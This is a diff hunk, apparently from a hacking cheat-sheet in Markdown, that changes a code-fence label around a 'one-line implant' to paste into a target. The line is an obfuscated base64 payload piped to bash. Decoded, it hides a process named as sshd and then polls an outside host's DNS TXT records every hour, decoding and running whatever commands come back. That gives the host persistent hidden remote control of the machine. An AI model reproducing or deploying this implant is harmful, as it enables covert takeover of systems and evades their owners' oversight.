@@ -1896,7 +1896,7 @@ rm -f x.txt
 ```
 
 Cut & paste the 1-line implant into the target:
-```
+```shell
 echo RD1iMDBtMi50ZWFtLXRlc28ubmV0ClA9InNzaGQ6IC91c3Ivc2Jpbi9zc2hkIC1EIFtsaXN0ZW5lcl0gMCBvZiAxMC0xMDAgc3RhcnR1cHMiCk09L2Rldi9zaG0vLmNhY2hlJHtVSUR9ClsgLWYgJE0gXSYmZXhpdAp0b3VjaCAkTQooZWNobyAnc2xwKCl7IGxvY2FsIElGUztbIC1uICIke19zZmQ6LX0iIF18fGV4ZWMge19zZmR9PD4gPCg6KTtyZWFkIC10JDEgLXUkX3NmZHx8Ojt9CnNscCAxCndoaWxlIDo7IGRvCmRpZyArc2hvcnQgJyIkRCInIFRYVHx0ciAtZCBcIFwifGJhc2U2NCAtZHxiYXNoCnNscCAzNjAwCmRvbmUnfGV4ZWMgLWEgIiRQIiBiYXNoICYpICY+L2Rldi9udWxsCg==|base64 -d|bash
 ```
 
